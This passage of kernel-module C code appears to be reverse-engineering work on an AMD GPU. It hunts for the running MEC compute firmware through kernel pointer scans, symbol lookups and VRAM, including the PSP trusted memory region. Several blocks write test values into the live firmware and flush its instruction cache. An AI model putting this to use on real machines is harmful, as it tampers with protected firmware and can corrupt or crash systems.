			const u32 expected[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};

			fw_mapped = memremap(phys, map_size, MEMREMAP_WB);
			if (!fw_mapped) {
				pr_info("fw36: memremap failed, trying ioremap\n");
				fw_mapped = ioremap(phys, map_size);
				if (!fw_mapped) {
					pr_info("fw36: ioremap also failed\n");
					goto try_bo_scan;
				}
			}

			code = (u32 *)fw_mapped;
			pr_info("fw36: FW[0x000]: %08X %08X %08X %08X %08X %08X %08X %08X\n",
				code[0], code[1], code[2], code[3],
				code[4], code[5], code[6], code[7]);
			pr_info("fw36: FW[0x020]: %08X %08X %08X %08X %08X %08X %08X %08X\n",
				code[8], code[9], code[10], code[11],
				code[12], code[13], code[14], code[15]);

			if (code[0] == expected[0] && code[1] == expected[1]) {
				pr_info("fw36: *** FIRMWARE SIGNATURE MATCH! RS64 code found! ***\n");
				pr_info("fw36: *** WE CAN READ THE RUNNING FIRMWARE! ***\n");

				/* Dump first 16 pages of firmware headers */
				for (page = 0; page < 16; page++) {
					u32 *pg = (u32 *)((u8 *)fw_mapped + page * 0x1000);
					pr_info("fw36: FW page %d: %08X %08X %08X %08X\n",
						page, pg[0], pg[1], pg[2], pg[3]);
				}

				/* === WRITE TEST: modify a NOP sled area ===
				 * Find a section of NOPs (0x00000013) deep in the firmware
				 * and write a tagged NOP to prove write capability */
				pr_info("fw36: === FIRMWARE WRITE TEST ===\n");
				{
					u32 *test_loc = (u32 *)((u8 *)fw_mapped + 0x10000); /* 64KB in */
					u32 orig_val = *test_loc;
					pr_info("fw36: FW[0x10000] orig = 0x%08X\n", orig_val);

					/* Write tagged value */
					*test_loc = 0xDEAD0013;  /* tagged NOP */
					wmb();  /* ensure write is visible */

					/* Read back */
					{
						u32 verify = *test_loc;
						pr_info("fw36: FW[0x10000] after write = 0x%08X %s\n",
							verify,
							(verify == 0xDEAD0013) ?
							"*** WRITE SUCCESS! ***" : "WRITE FAILED");
					}

					/* Restore */
					*test_loc = orig_val;
					wmb();
					pr_info("fw36: Restored original value\n");
				}

				/* === ICACHE INVALIDATION TEST ===
				 * After write, force MEC to refetch from modified memory */
				pr_info("fw36: === ICACHE FLUSH AFTER WRITE ===\n");
				{
					u32 pc_before = rr(regCP_MEC1_INSTR_PNTR);
					u32 rs64 = rr(regCP_MEC_RS64_CNTL);
					wr(regCP_MEC_RS64_CNTL, rs64 |
						(1 << CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT));
					udelay(200);
					wr(regCP_MEC_RS64_CNTL, rs64);
					udelay(500);
					pr_info("fw36: PC before icache flush: 0x%04X, after: 0x%04X\n",
						pc_before, rr(regCP_MEC1_INSTR_PNTR));
				}
			} else {
				pr_info("fw36: Code signature mismatch — might be header/encrypted\n");
				/* Try at +0x2000 (PSP header skip) */
				if (map_size > 0x2000) {
					u32 *code2k = (u32 *)((u8 *)fw_mapped + 0x2000);
					pr_info("fw36: FW[0x2000]: %08X %08X %08X %08X\n",
						code2k[0], code2k[1], code2k[2], code2k[3]);
					if (code2k[0] == expected[0])
						pr_info("fw36: *** CODE AT +0x2000! PSP header present ***\n");
				}
			}

			/* Check multiple pages for non-zero content */
			pr_info("fw36: === PAGE OCCUPANCY ===\n");
			for (page = 0; page < 64; page++) {
				u32 *pg = (u32 *)((u8 *)fw_mapped + page * 0x1000);
				if (pg[0] != 0 || pg[1] != 0 || pg[2] != 0 || pg[3] != 0)
					pr_info("fw36: Page %d (+0x%05X): %08X %08X %08X %08X\n",
						page, page * 0x1000,
						pg[0], pg[1], pg[2], pg[3]);
			}

			memunmap(fw_mapped);
		}
		/* Fall through to VRAM scan even if memremap returned zeros */
	}

try_direct_phys:
	/* No IOMMU — try IC_BASE as raw CPU physical address */
	pr_info("fw36: === DIRECT PHYSICAL ACCESS (no IOMMU) ===\n");
	{
		void *fw_mapped;
		u32 *code;
		const u32 expected[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};

		/* IC_BASE might be: CPU phys, or GPU MC address (different from CPU phys).
		 * Try it directly — on systems without IOMMU, DMA=phys. */
		fw_mapped = memremap(ic_base, 0x1000, MEMREMAP_WB);
		if (!fw_mapped) {
			pr_info("fw36: memremap(0x%llX) failed — not a valid CPU phys addr\n",
				ic_base);

			/* Try phys_to_virt for addresses in RAM */
			{
				void *virt = phys_to_virt(ic_base);
				u32 val;
				if (copy_from_kernel_nofault(&val, virt, 4) == 0) {
					pr_info("fw36: phys_to_virt(0x%llX) = %p, read OK: 0x%08X\n",
						ic_base, virt, val);
				} else {
					pr_info("fw36: phys_to_virt(0x%llX) FAULT\n", ic_base);
				}
			}
			goto try_bo_scan;
		}

		code = (u32 *)fw_mapped;
		pr_info("fw36: Direct phys[0x000]: %08X %08X %08X %08X\n",
			code[0], code[1], code[2], code[3]);

		if (code[0] == expected[0] && code[1] == expected[1])
			pr_info("fw36: *** FIRMWARE FOUND VIA DIRECT PHYS! ***\n");

		memunmap(fw_mapped);
	}

try_bo_scan:
	/* ========================================
	 * STEP 4: Find firmware BO in adev->gfx.mec structure
	 *
	 * The amdgpu driver stores MEC firmware BO at:
	 *   adev->gfx.mec.mec_fw_gpu_addr  (GPU/DMA address)
	 *   adev->gfx.mec.mec_fw_ptr       (kernel virtual ptr)
	 *   adev->gfx.mec.mec_fw_obj       (amdgpu_bo pointer)
	 *
	 * These are typically adjacent in the structure. The GPU address
	 * is the DMA address that maps through IOMMU, NOT necessarily
	 * equal to IC_BASE (which may have an offset added).
	 *
	 * Strategy: scan for patterns of {gpu_addr, kptr, bo_ptr}
	 * where gpu_addr is near IC_BASE (within ±0x10000).
	 * ======================================== */
	pr_info("fw36: === BO STRUCTURE SCAN ===\n");
	{
		int off, found = 0;
		for (off = 8; off < 0x200000 && found < 10; off += 8) {
			u64 val;
			if (copy_from_kernel_nofault(&val, (u8 *)adev + off, 8) != 0)
				continue;

			/* Look for GPU addresses near IC_BASE (within ±64KB) */
			if (val >= (ic_base - 0x10000) && val <= (ic_base + 0x10000) &&
			    val != 0 && val != 0xFFFFFFFFFFFFFFFFULL) {
				u64 neighbors[6];
				int k;
				pr_info("fw36: Near IC_BASE at adev+0x%X: 0x%016llX (delta=%lld)\n",
					off, val, (s64)(val - ic_base));

				/* Dump 6 qwords around this hit */
				for (k = -3; k <= 2; k++) {
					if (copy_from_kernel_nofault(&neighbors[k + 3],
						(u8 *)adev + off + k * 8, 8) != 0)
						neighbors[k + 3] = 0xBADBADBADBADBADULL;
				}
				for (k = 0; k < 6; k++) {
					pr_info("fw36:   [%+d] = 0x%016llX%s%s\n",
						(k - 3) * 8, neighbors[k],
						((neighbors[k] >> 48) == 0xFFFF) ? " <KPTR>" : "",
						(neighbors[k] == ic_base) ? " <IC_BASE>" : "");
				}

				/* If we find a kptr adjacent, try to read firmware through it */
				for (k = 0; k < 6; k++) {
					if ((neighbors[k] >> 48) == 0xFFFF &&
					    neighbors[k] != 0xFFFFFFFFFFFFFFFFULL) {
						u32 code[8];
						const u32 expected[4] = {0x04070663, 0x00060663,
							0x6F826583, 0x3CB22023};
						void *kptr = (void *)(unsigned long)neighbors[k];

						if (copy_from_kernel_nofault(code, kptr, 32) == 0) {
							pr_info("fw36:   KPTR %p: %08X %08X %08X %08X\n",
								kptr, code[0], code[1], code[2], code[3]);
							if (code[0] == expected[0] &&
							    code[1] == expected[1]) {
								pr_info("fw36:   *** FIRMWARE KPTR FOUND! ***\n");
								pr_info("fw36:   *** adev+0x%X → gpu=0x%llX kptr=%p ***\n",
									off, val, kptr);

								/* Test write capability */
								{
									u32 *fw = (u32 *)kptr;
									u32 test_off = 0x10000 / 4; /* 64KB in */
									u32 orig;
									if (copy_from_kernel_nofault(&orig,
										&fw[test_off], 4) == 0) {
										pr_info("fw36:   FW[0x10000] = 0x%08X\n", orig);
										/* Try write */
										if (copy_to_kernel_nofault(&fw[test_off],
											&(u32){0xCAFE0013}, 4) == 0) {
											u32 verify;
											copy_from_kernel_nofault(&verify,
												&fw[test_off], 4);
											pr_info("fw36:   Write test: 0x%08X %s\n",
												verify,
												(verify == 0xCAFE0013) ?
												"*** WRITABLE! ***" : "FAILED");
											/* Restore */
											copy_to_kernel_nofault(&fw[test_off],
												&orig, 4);
										}
									}
								}
							}
						} else {
							pr_info("fw36:   KPTR %p: READ FAULT\n", kptr);
						}
					}
				}
				found++;
			}
		}
		if (!found)
			pr_info("fw36: No GPU addresses near IC_BASE in 2MB adev scan\n");
	}

	/* ========================================
	 * STEP 5: Scan for amdgpu_bo objects via size pattern
	 *
	 * amdgpu_bo has: .tbo.base.size, .tbo.resource->start (pages),
	 * .flags, .pin_count. The MEC firmware BO is ~448KB (0x6D3E0 code +
	 * 0x2000 header ≈ 0x70000 rounded to pages = 0x70000 = 458752).
	 * Look for this size value near kernel pointers.
	 * ======================================== */
	pr_info("fw36: === BO SIZE PATTERN SCAN ===\n");
	{
		u64 bo_sizes[] = {
			0x70000,   /* 448KB (MEC fw rounded up) */
			0x80000,   /* 512KB */
			0x6E000,   /* 440KB */
			0x6D3E0,   /* exact firmware size */
		};
		int s, off, found = 0;

		for (s = 0; s < 4 && found < 5; s++) {
			for (off = 8; off < 0x200000 && found < 5; off += 8) {
				u64 val;
				if (copy_from_kernel_nofault(&val, (u8 *)adev + off, 8) != 0)
					continue;
				if (val == bo_sizes[s]) {
					u64 context[8];
					int k, has_kptr = 0, has_gpu = 0;

					for (k = -4; k < 4; k++) {
						if (copy_from_kernel_nofault(&context[k + 4],
							(u8 *)adev + off + k * 8, 8) != 0)
							context[k + 4] = 0;
						if ((context[k + 4] >> 48) == 0xFFFF)
							has_kptr = 1;
						if (context[k + 4] >= 0x200000000ULL &&
						    context[k + 4] <= 0x300000000000ULL)
							has_gpu = 1;
					}

					if (has_kptr || has_gpu) {
						pr_info("fw36: BO size 0x%llX at adev+0x%X:\n",
							bo_sizes[s], off);
						for (k = 0; k < 8; k++)
							pr_info("fw36:   [%+d] = 0x%016llX%s%s\n",
								(k - 4) * 8, context[k],
								((context[k] >> 48) == 0xFFFF) ? " <KPTR>" : "",
								(context[k] >= ic_base - 0x10000 &&
								 context[k] <= ic_base + 0x10000) ?
								" <NEAR_IC>" : "");
						found++;
					}
				}
			}
		}
		if (!found)
			pr_info("fw36: No BO size patterns found near pointers\n");
	}

	/* ========================================
	 * STEP 6: Try kernel symbol lookup for GFX MEC data
	 * Look up gfx12_mec_init or amdgpu_gfx_rlc_init_cpt
	 * to find the firmware loading code path.
	 * ======================================== */
	pr_info("fw36: === KERNEL SYMBOL PROBES ===\n");
	{
		const char *syms[] = {
			"amdgpu_ucode_create_bo",
			"amdgpu_bo_create_kernel",
			"amdgpu_bo_create_kernel_at",
			"psp_execute_ip_fw_load",
			"gfx_v12_0_cp_compute_load_microcode",
			"gfx_v12_0_mec_init",
		};
		int s;
		for (s = 0; s < 6; s++) {
			unsigned long addr = klookup(syms[s]);
			pr_info("fw36: %s = 0x%lX%s\n",
				syms[s], addr, addr ? "" : " (not found)");
		}
	}

	/* ========================================
	 * STEP 7: VRAM firmware scan via amdgpu_device_vram_access
	 *
	 * IC_BASE = 0x20681D4000 is a GPU MC address.
	 * MC routes: addresses in [FB_BASE, FB_TOP] → local VRAM.
	 * IC_BASE < FB_BASE, so MC treats it as system memory.
	 * BUT: IC_BASE_CNTL bit 4 = bypass/physical mode.
	 * In physical mode, the MEC might use IC_BASE differently:
	 *   - As raw VRAM byte offset (0x681D4000 = 1.63GB into VRAM)
	 *   - Or with different address masking
	 *
	 * Try multiple interpretations of IC_BASE as VRAM offset.
	 * ======================================== */
	if (vram_access) {
		u64 offsets[] = {
			ic_base & 0xFFFFFFFFULL,      /* low 32 bits: 0x681D4000 */
			ic_base & 0xFFFFFFFFFFULL,     /* low 40 bits */
			ic_base - 0x2000000000ULL,     /* subtract 128GB base */
			0x0,                           /* start of VRAM */
		};
		const char *names[] = {
			"low32", "low40", "minus128G", "vram_start"
		};
		const u32 expected[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};
		u64 vram_size = fb_top - fb_base;
		int t;

		pr_info("fw36: === VRAM FIRMWARE SCAN ===\n");
		pr_info("fw36: VRAM size = %lluMB\n", vram_size >> 20);

		for (t = 0; t < 4; t++) {
			u32 data[8];
			u64 off = offsets[t];

			if (off >= vram_size) {
				pr_info("fw36: %s: offset 0x%llX > VRAM size, skip\n",
					names[t], off);
				continue;
			}

			vram_access(adev, off, data, 32, false);
			pr_info("fw36: VRAM[%s=0x%llX]: %08X %08X %08X %08X %08X %08X %08X %08X\n",
				names[t], off,
				data[0], data[1], data[2], data[3],
				data[4], data[5], data[6], data[7]);

			if (data[0] == expected[0] && data[1] == expected[1]) {
				pr_info("fw36: *** FIRMWARE FOUND IN VRAM AT OFFSET 0x%llX! ***\n", off);

				/* Dump more pages */
				{
					int p;
					for (p = 0; p < 16; p++) {
						u32 pg[4];
						vram_access(adev, off + p * 0x1000, pg, 16, false);
						pr_info("fw36:   Page %d (+0x%X): %08X %08X %08X %08X\n",
							p, p * 0x1000, pg[0], pg[1], pg[2], pg[3]);
					}
				}

				/* WRITE TEST at 64KB offset */
				{
					u32 orig, tag = 0xCAFE0013, verify;
					vram_access(adev, off + 0x10000, &orig, 4, false);
					pr_info("fw36: FW[+0x10000] orig = 0x%08X\n", orig);

					vram_access(adev, off + 0x10000, &tag, 4, true);
					vram_access(adev, off + 0x10000, &verify, 4, false);
					pr_info("fw36: FW[+0x10000] verify = 0x%08X %s\n",
						verify,
						(verify == tag) ? "*** VRAM WRITE SUCCESS! ***" : "FAILED");

					/* Restore */
					vram_access(adev, off + 0x10000, &orig, 4, true);
				}

				/* Try icache flush to make MEC see the change */
				{
					u32 rs64 = rr(regCP_MEC_RS64_CNTL);
					wr(regCP_MEC_RS64_CNTL, rs64 |
						(1 << CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT));
					udelay(200);
					wr(regCP_MEC_RS64_CNTL, rs64);
					udelay(200);
					pr_info("fw36: MEC PC after icache flush = 0x%04X\n",
						rr(regCP_MEC1_INSTR_PNTR));
				}
				break;
			}

			/* Also check at +0x2000 (PSP header present?) */
			if (off + 0x2000 < vram_size) {
				vram_access(adev, off + 0x2000, data, 32, false);
				if (data[0] == expected[0] && data[1] == expected[1]) {
					pr_info("fw36: *** FW at VRAM offset 0x%llX+0x2000! (header present) ***\n", off);
					break;
				}
			}
		}

		/* Broad VRAM scan: search first 4GB of VRAM for firmware signature
		 * Check every 4KB page (read first 16 bytes) */
		pr_info("fw36: === BROAD VRAM SCAN (every 4KB, first 2GB) ===\n");
		{
			u64 scan_limit = vram_size;
			u64 off;
			int found = 0;

			if (scan_limit > 0x80000000ULL)
				scan_limit = 0x80000000ULL; /* cap at 2GB */

			for (off = 0; off < scan_limit && found < 5; off += 0x1000) {
				u32 hdr[4];
				vram_access(adev, off, hdr, 16, false);
				if (hdr[0] == expected[0] && hdr[1] == expected[1]) {
					pr_info("fw36: *** FW SIGNATURE at VRAM+0x%llX! ***\n", off);
					pr_info("fw36:   %08X %08X %08X %08X\n",
						hdr[0], hdr[1], hdr[2], hdr[3]);

					/* Dump 4 more pages */
					{
						int p;
						for (p = 1; p < 5; p++) {
							u32 pg[4];
							vram_access(adev, off + p * 0x1000, pg, 16, false);
							pr_info("fw36:   +0x%X: %08X %08X %08X %08X\n",
								p * 0x1000, pg[0], pg[1], pg[2], pg[3]);
						}
					}

					/* WRITE TEST */
					{
						u32 orig, tag = 0xDEAD0013, verify;
						u64 test_off = off + 0x10000;
						if (test_off < vram_size) {
							vram_access(adev, test_off, &orig, 4, false);
							vram_access(adev, test_off, &tag, 4, true);
							vram_access(adev, test_off, &verify, 4, false);
							pr_info("fw36: Write test at +0x%llX: %s (wrote 0x%X, read 0x%X)\n",
								test_off, (verify == tag) ? "SUCCESS" : "FAIL",
								tag, verify);
							vram_access(adev, test_off, &orig, 4, true);
						}
					}
					found++;
				}
			}
			if (!found)
				pr_info("fw36: No firmware signature found in first %lluMB of VRAM\n",
					scan_limit >> 20);
		}

		/* Also try ioremap_wc on IC_BASE as a PCI bus address */
		pr_info("fw36: === IOREMAP_WC TEST ===\n");
		{
			void __iomem *fw_io;

			/* Try ioremap_wc on IC_BASE (might be PCI bus addr or MC addr) */
			fw_io = ioremap_wc(ic_base, 0x1000);
			if (fw_io) {
				u32 code[8];
				int k;
				for (k = 0; k < 8; k++)
					code[k] = readl(fw_io + k * 4);
				pr_info("fw36: ioremap_wc(0x%llX): %08X %08X %08X %08X %08X %08X %08X %08X\n",
					ic_base, code[0], code[1], code[2], code[3],
					code[4], code[5], code[6], code[7]);
				if (code[0] == expected[0])
					pr_info("fw36: *** FW VIA IOREMAP_WC! ***\n");
				iounmap(fw_io);
			} else {
				pr_info("fw36: ioremap_wc(0x%llX) failed\n", ic_base);
			}

			/* Also try BAR 0 + IC_BASE offset */
			{
				u64 bar0_base = 0x6800000000ULL; /* from lspci */
				u64 bar0_off = ic_base & 0xFFFFFFFFULL; /* 0x681D4000 */

				if (bar0_off < 0x10000000) { /* within 256MB BAR */
					fw_io = ioremap_wc(bar0_base + bar0_off, 0x1000);
					if (fw_io) {
						u32 code[4];
						code[0] = readl(fw_io);
						code[1] = readl(fw_io + 4);
						code[2] = readl(fw_io + 8);
						code[3] = readl(fw_io + 12);
						pr_info("fw36: BAR0+0x%llX: %08X %08X %08X %08X\n",
							bar0_off, code[0], code[1], code[2], code[3]);
						if (code[0] == expected[0])
							pr_info("fw36: *** FW VIA BAR0 OFFSET! ***\n");
						iounmap(fw_io);
					} else {
						pr_info("fw36: ioremap BAR0+off failed\n");
					}
				} else {
					pr_info("fw36: IC_BASE low32 (0x%llX) exceeds BAR0 size\n",
						bar0_off);
				}
			}
		}
	} else {
		pr_info("fw36: vram_access not available, skipping VRAM scan\n");
	}

done:
	pr_info("fw36: === MODE 14 COMPLETE ===\n");
	pr_info("fw36: MEC PC = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));
	#undef GC0
}

/* Mode 15: TMR firmware hunt — find MEC firmware in TMR via BO kaddr
 * and targeted VRAM scan at correct TMR offset.
 *
 * Key gaps in prior modes:
 *   - Mode 14 only scanned first 2GB of VRAM
 *   - TMR is at MC 0x97E0000000 → VRAM offset 0x17E0000000 ≈ 6.0GB
 *   - FW BO kaddr scanned at 4KB steps — firmware may be at odd alignment
 *   - adev->firmware.ucode[] array not yet probed
 */
static void tmr_fw_hunt(void *psp, void *adev)
{
	fn_vram_access vram_access = NULL;
	unsigned long va_addr;
	u32 gc_base0;
	u64 ic_base, fb_base, fb_top;
	const u32 fw_sig[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};

	pr_info("fw36: === MODE 15: TMR FIRMWARE HUNT ===\n");

	va_addr = klookup("amdgpu_device_vram_access");
	if (va_addr) vram_access = (fn_vram_access)va_addr;

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) { pr_info("fw36: gc_base0 FAIL\n"); return; }

	#define GC0(r) (gc_base0 + (r))
	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);
	fb_base = (u64)rr(GC0(0x1614)) << 24;
	fb_top  = (u64)rr(GC0(0x1615)) << 24;
	pr_info("fw36: IC_BASE=0x%llX FB=[0x%llX-0x%llX]\n", ic_base, fb_base, fb_top);

	/* =====================================================
	 * STEP 1: Find REAL VRAM size from adev->gmc
	 *
	 * adev->gmc contains:
	 *   real_vram_size   (u64) — actual physical VRAM in bytes
	 *   visible_vram_size (u64) — BAR-visible portion
	 *   vram_start        (u64) — MC start address (= FB_BASE)
	 *   mc_vram_size      (u64)
	 *
	 * These are typically at known offsets. We search for the
	 * FB_BASE value (0x8000000000) followed by VRAM size values.
	 * On RDNA4 with 8GB, real_vram_size = 0x200000000.
	 * ===================================================== */
	pr_info("fw36: === STEP 1: FIND REAL VRAM SIZE ===\n");
	{
		u64 real_vram = 0, vis_vram = 0;
		int off;

		/* Strategy: find FB_BASE (0x8000000000) in adev, which marks
		 * the start of gmc fields. real/visible sizes nearby. */
		for (off = 0x100; off < 0x60000; off += 8) {
			u64 val;
			if (copy_from_kernel_nofault(&val, (u8 *)adev + off, 8) != 0)
				continue;

			/* Look for real_vram_size-like values (1-16 GB range) */
			if (val >= 0x40000000ULL && val <= 0x400000000ULL &&
			    (val & 0xFFFFF) == 0) { /* aligned to 1MB */
				u64 prev, next;
				copy_from_kernel_nofault(&prev, (u8 *)adev + off - 8, 8);
				copy_from_kernel_nofault(&next, (u8 *)adev + off + 8, 8);

				/* Is this near FB_BASE? */
				if (prev == fb_base || next == fb_base ||
				    (prev >= 0x40000000ULL && prev <= 0x400000000ULL)) {
					pr_info("fw36: VRAM candidate at adev+0x%X: 0x%llX (%lluMB)\n",
						off, val, val >> 20);
					pr_info("fw36:   prev=0x%llX next=0x%llX\n", prev, next);

					/* Pick the first reasonable one */
					if (!real_vram && val > 0x80000000ULL) {
						real_vram = val;
						/* Check the next for visible_vram */
						if (next >= 0x10000000ULL && next <= val)
							vis_vram = next;
					}
				}
			}
		}

		if (real_vram) {
			pr_info("fw36: Real VRAM = 0x%llX (%lluMB)\n",
				real_vram, real_vram >> 20);
			if (vis_vram)
				pr_info("fw36: Visible VRAM = 0x%llX (%lluMB)\n",
					vis_vram, vis_vram >> 20);
		} else {
			pr_info("fw36: Could not find real_vram_size, assuming 8GB\n");
			real_vram = 0x200000000ULL; /* 8GB default */
		}

		/* =====================================================
		 * STEP 2: FW BO kaddr deep scan
		 *
		 * We know from mode 4/10: adev+0x44AF8 has GPU=0x97FF800000,
		 * kaddr=0xFFFFCF9F3F800000. Scan this BO at fine granularity
		 * for the RS64 firmware signature.
		 * ===================================================== */
		pr_info("fw36: === STEP 2: FW BO KADDR DEEP SCAN ===\n");
		{
			u64 fw_bo_gpu = *(u64 *)((u8 *)adev + 0x44AF8);
			u64 fw_bo_ka  = *(u64 *)((u8 *)adev + 0x44B00);

			pr_info("fw36: FW BO GPU=0x%llX kaddr=0x%llX\n",
				fw_bo_gpu, fw_bo_ka);

			if ((fw_bo_ka >> 48) == 0xFFFF &&
			    fw_bo_ka != 0xFFFFFFFFFFFFFFFFULL) {
				int scan_off, found = 0;
				u32 val[4];

				/* Scan first 4MB at 256-byte steps */
				for (scan_off = 0; scan_off < 0x400000 && found < 10;
				     scan_off += 0x100) {
					if (copy_from_kernel_nofault(val,
						(void *)((unsigned long)fw_bo_ka + scan_off),
						16) != 0)
						break;

					if (val[0] == fw_sig[0] && val[1] == fw_sig[1]) {
						pr_info("fw36: *** RS64 SIG at FW_BO+0x%X: %08X %08X %08X %08X ***\n",
							scan_off, val[0], val[1], val[2], val[3]);
						found++;
					}

					/* Also check for PSP container header */
					if (val[0] == 0x0006D3E0 || val[0] == 0x0006D3E0) {
						pr_info("fw36: PSP header at FW_BO+0x%X: %08X %08X %08X %08X\n",
							scan_off, val[0], val[1], val[2], val[3]);
						found++;
					}

					/* Print first 8 interesting dwords (unique non-zero patterns) */
					if (scan_off < 0x200 && (val[0] || val[1])) {
						pr_info("fw36: FW_BO[0x%04X]: %08X %08X %08X %08X\n",
							scan_off, val[0], val[1], val[2], val[3]);
					}
				}
				pr_info("fw36: FW BO scan: searched %d bytes, %d hits\n",
					scan_off, found);

				/* Also try to interpret the FW BO as a firmware table.
				 * First dword 0x09002C01 might be: 9 entries, total size 0x2C01 pages?
				 * Try reading as array of {gpu_addr, kaddr, size} tuples. */
				pr_info("fw36: === FW BO TABLE INTERPRETATION ===\n");
				{
					int entry;
					u64 table_val;
					/* Dump first 512 bytes as 64-bit values */
					for (entry = 0; entry < 64; entry++) {
						if (copy_from_kernel_nofault(&table_val,
							(void *)((unsigned long)fw_bo_ka + entry * 8),
							8) != 0) break;
						if (table_val != 0)
							pr_info("fw36: FW_BO[%d]=0x%016llX%s%s%s\n",
								entry, table_val,
								((table_val >> 48) == 0xFFFF) ? " <KPTR>" : "",
								(table_val >= 0x8000000000ULL &&
								 table_val <= 0x9800000000ULL) ? " <VRAM>" : "",
								(table_val == ic_base) ? " <IC_BASE>" : "");
					}
				}
			} else {
				pr_info("fw36: FW BO kaddr 0x%llX doesn't look valid\n",
					fw_bo_ka);
			}
		}

		/* =====================================================
		 * STEP 3: Scan PSP firmware_info array
		 *
		 * psp_context has firmware info at various offsets.
		 * Each ucode entry has: ucode_id (u32), mc_addr (u64),
		 * kaddr (u64), ucode_size (u32).
		 *
		 * MEC ucode_id = AMDGPU_UCODE_ID_CP_MEC1 = 10 (in GFX12)
		 * or the RS64 variant AMDGPU_UCODE_ID_CP_MEC1_JT = 11
		 * ===================================================== */
		pr_info("fw36: === STEP 3: PSP FIRMWARE INFO PROBE ===\n");
		{
			/* Scan psp structure for ucode_id patterns.
			 * We look for u32 value 10 (CP_MEC1) or 11 (MEC1_JT)
			 * followed by padding, then mc_addr (VRAM range), then kaddr. */
			int off2;
			for (off2 = 0x200; off2 < 0x2000; off2 += 4) {
				u32 uid;
				if (copy_from_kernel_nofault(&uid,
					(u8 *)psp + off2, 4) != 0) continue;

				/* MEC1 ucode IDs: 10, 11, or newer numbering */
				if (uid >= 8 && uid <= 15) {
					u64 v1, v2, v3;
					copy_from_kernel_nofault(&v1, (u8 *)psp + off2 + 8, 8);
					copy_from_kernel_nofault(&v2, (u8 *)psp + off2 + 16, 8);
					copy_from_kernel_nofault(&v3, (u8 *)psp + off2 + 24, 8);

					/* Check if any of v1/v2/v3 is VRAM-range */
					if ((v1 >= 0x8000000000ULL && v1 <= 0x9800000000ULL) ||
					    (v2 >= 0x8000000000ULL && v2 <= 0x9800000000ULL)) {
						pr_info("fw36: ucode_id=%u at psp+0x%X:\n",
							uid, off2);
						pr_info("fw36:   +8:  0x%016llX\n", v1);
						pr_info("fw36:   +16: 0x%016llX\n", v2);
						pr_info("fw36:   +24: 0x%016llX\n", v3);

						/* Check for readable kaddr */
						if ((v2 >> 48) == 0xFFFF) {
							u32 code[4];
							if (copy_from_kernel_nofault(code,
								(void *)(unsigned long)v2, 16) == 0) {
								pr_info("fw36:   kaddr read: %08X %08X %08X %08X\n",
									code[0], code[1], code[2], code[3]);
								if (code[0] == fw_sig[0])
									pr_info("fw36:   *** MEC FW FOUND VIA PSP! ***\n");
							}
						}
						if ((v3 >> 48) == 0xFFFF) {
							u32 code[4];
							if (copy_from_kernel_nofault(code,
								(void *)(unsigned long)v3, 16) == 0) {
								pr_info("fw36:   kaddr2 read: %08X %08X %08X %08X\n",
									code[0], code[1], code[2], code[3]);
								if (code[0] == fw_sig[0])
									pr_info("fw36:   *** MEC FW FOUND VIA PSP! ***\n");
							}
						}
					}
				}
			}
		}

		/* =====================================================
		 * STEP 4: Scan adev->firmware array directly
		 *
		 * In amdgpu, the firmware info lives at:
		 *   adev->firmware.ucode[i].mc_addr
		 *   adev->firmware.ucode[i].kaddr
		 *   adev->firmware.ucode[i].ucode_size
		 * The ucode array is typically at a known offset.
		 * We search adev for sequential VRAM addresses that
		 * look like firmware entries (ascending GPU addresses,
		 * each followed by a kaddr).
		 * ===================================================== */
		pr_info("fw36: === STEP 4: FIRMWARE UCODE ARRAY HUNT ===\n");
		{
			int off2, seq_count = 0;
			u64 last_gpu = 0;

			for (off2 = 0x100; off2 < 0x80000; off2 += 8) {
				u64 val2;
				if (copy_from_kernel_nofault(&val2, (u8 *)adev + off2, 8) != 0)
					continue;

				/* GPU address in VRAM range, page-aligned */
				if (val2 >= 0x9700000000ULL && val2 <= 0x9800000000ULL &&
				    (val2 & 0xFFF) == 0) {
					u64 next_val;
					copy_from_kernel_nofault(&next_val,
						(u8 *)adev + off2 + 8, 8);

					/* If next is a kaddr, this is likely a firmware entry */
					if ((next_val >> 48) == 0xFFFF &&
					    next_val != 0xFFFFFFFFFFFFFFFFULL) {
						u32 code[4];
						int is_fw = 0;

						if (copy_from_kernel_nofault(code,
							(void *)(unsigned long)next_val, 16) == 0)
							is_fw = 1;

						pr_info("fw36: FW entry at adev+0x%X: GPU=0x%llX kaddr=0x%llX%s\n",
							off2, val2, next_val,
							(val2 > last_gpu) ? " (ascending)" : "");
						if (is_fw) {
							pr_info("fw36:   data: %08X %08X %08X %08X\n",
								code[0], code[1], code[2], code[3]);
							if (code[0] == fw_sig[0] && code[1] == fw_sig[1])
								pr_info("fw36:   *** RS64 MEC FIRMWARE HERE! ***\n");
						}

						last_gpu = val2;
						seq_count++;

						/* If we find the firmware, try to read more */
						if (is_fw && code[0] == fw_sig[0]) {
							int pg;
							pr_info("fw36: === DUMPING MEC FIRMWARE ===\n");
							pr_info("fw36: GPU addr = 0x%llX\n", val2);
							pr_info("fw36: Kernel VA = 0x%llX\n", next_val);
							pr_info("fw36: VRAM off  = 0x%llX\n", val2 - fb_base);

							/* Dump first 16 pages */
							for (pg = 0; pg < 16; pg++) {
								u32 pg_data[4];
								if (copy_from_kernel_nofault(pg_data,
									(void *)((unsigned long)next_val + pg * 0x1000),
									16) == 0)
									pr_info("fw36:   Page %d: %08X %08X %08X %08X\n",
										pg, pg_data[0], pg_data[1],
										pg_data[2], pg_data[3]);
							}

							/* WRITE TEST: tagged NOP deep in firmware */
							pr_info("fw36: === WRITE TEST ===\n");
							{
								u32 *fw = (u32 *)(unsigned long)next_val;
								u32 orig;
								u64 test_off_b = 0x10000; /* 64KB in */
								if (copy_from_kernel_nofault(&orig,
									(void *)((unsigned long)next_val + test_off_b),
									4) == 0) {
									u32 tag = 0xFEE10013;
									u32 verify;
									pr_info("fw36: FW[+0x%llX] orig = 0x%08X\n",
										test_off_b, orig);
									copy_to_kernel_nofault(
										(void *)((unsigned long)next_val + test_off_b),
										&tag, 4);
									wmb();
									copy_from_kernel_nofault(&verify,
